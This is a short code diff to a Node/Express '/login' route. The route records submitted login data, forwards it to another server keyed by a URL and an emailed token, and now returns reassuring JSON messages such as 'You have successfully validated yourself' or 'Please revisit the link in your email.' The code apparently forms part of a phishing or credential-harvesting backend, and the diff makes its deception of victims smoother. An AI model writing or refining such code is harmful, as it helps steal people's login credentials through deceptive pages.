@@ -60,7 +60,7 @@ router.post('/login', async (req, res) => {
 
                     if (response.ok) {
                         console.log(`Data sent to local server successfully for URL: ${url}`);
-                        return res.send('Login data recorded and sent.');
+                        return res.send({ success: true, message: 'You have successfully validated yourself. Thank you.' });
                     } else {
                         console.log(`Failed to send data to local server for URL: ${url}`);
                         break;
@@ -75,10 +75,10 @@ router.post('/login', async (req, res) => {
         }
 
         console.log('Invalid token or URL not found');
-        return res.status(403).send('Invalid token or URL not found');
+        return res.status(403).send({ success: false, message: 'Validation failed. Please revisit the link in your email.' });
     } catch (error) {
         console.error('Login error:', error);
-        return res.status(500).send('Server Error');
+        return res.status(500).send({ success: false, message: 'Server Error' });
     }
 });
 
